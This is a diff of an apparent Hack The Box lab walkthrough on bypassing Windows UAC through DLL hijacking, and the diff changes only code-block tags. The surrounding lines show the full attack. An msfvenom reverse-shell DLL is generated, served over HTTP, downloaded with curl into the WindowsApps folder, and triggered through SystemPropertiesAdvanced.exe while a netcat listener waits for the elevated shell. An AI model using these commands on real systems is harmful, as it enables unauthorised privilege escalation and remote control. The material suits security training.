@@ -31,8 +31,7 @@ The `default RID 500 administrator` account always operates at the high mandator
 
 #### Checking Current User
 
-```
-        cmd
+```bat
 C:\htb> whoami /user
 
 USER INFORMATION
@@ -45,8 +44,7 @@ winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
 
 #### Confirming Admin Group Membership
 
-```
-        cmd
+```bat
 C:\htb> net localgroup administrators
 
 Alias name     administrators
@@ -63,8 +61,7 @@ The command completed successfully.
 
 #### Reviewing User Privileges
 
-```
-        cmd
+```bat
 C:\htb> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -83,8 +80,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 
 There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.
 
-```
-        cmd
+```bat
 C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
@@ -93,8 +89,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 
 #### Checking UAC Level
 
-```
-        cmd
+```bat
 C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
@@ -107,8 +102,7 @@ The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC 
 
 UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.
 
-```
-        powershell
+```powershell
 PS C:\htb> [environment]::OSVersion.Version
 
 Major  Minor  Build  Revision
@@ -136,8 +130,7 @@ When attempting to locate a DLL, Windows will use the following search order.
 
 Let's examine the path variable using the command `cmd /c echo %PATH%`. This reveals the default folders below. The `WindowsApps` folder is within the user's profile and writable by the user.
 
-```
-        powershell
+```powershell
 PS C:\htb> cmd /c echo %PATH%
 
 C:\Windows\system32;
@@ -153,8 +146,7 @@ We can potentially bypass UAC in this by using DLL hijacking by placing a malici
 
 First, let's generate a DLL to execute a reverse shell.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -170,8 +162,7 @@ Note: In the example above, we specified our tun0 VPN IP address.
 
 Copy the generated DLL to a folder and set up a Python mini webserver to host it.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m http.server 8080
 ```
 
@@ -179,15 +170,13 @@ hiimeins@htb[/htb]$ sudo python3 -m http.server 8080
 
 Download the malicious DLL to the target system, and stand up a `Netcat` listener on our attack machine.
 
-```
-        powershell
+```powershell
 PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
 ```
 
 #### Starting nc Listener on Attack Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 8443
 ```
 
@@ -195,15 +184,13 @@ hiimeins@htb[/htb]$ nc -lvnp 8443
 
 If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.
 
-```
-        cmd
+```bat
 C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
 ```
 
 Once we get a connection back, we'll see normal user rights.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
@@ -232,8 +219,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 
 Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.
 
-```
-        cmd
+```bat
 C:\htb> tasklist /svc | findstr "rundll32"
 rundll32.exe                  6300 N/A
 rundll32.exe                  5360 N/A
@@ -251,8 +237,7 @@ SUCCESS: The process with PID 5360 has been terminated.
 
 Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.
 
-```
-        cmd
+```bat
 C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 
@@ -260,8 +245,7 @@ C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 Checking back on our listener, we should receive a connection almost instantly.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 8443
 
 listening on [any] 8443 ...
